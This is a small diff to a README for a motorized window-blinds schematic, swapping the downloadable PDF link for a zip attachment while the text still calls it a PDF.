@@ -18,7 +18,9 @@ This schematic is designed to allow a motor to open and close the blinds dependi
 
 ## Resouces
 
-The schematic as PDF is downloadable, [Schematic design_V2.pdf](https://github.com/user-attachments/files/23378231/Schematic.design_V2.pdf)
+The schematic as PDF is downloadable, [Schematic.design_V2 (3).zip](https://github.com/user-attachments/files/23429875/Schematic.design_V2.3.zip)
+
+
 
 
 
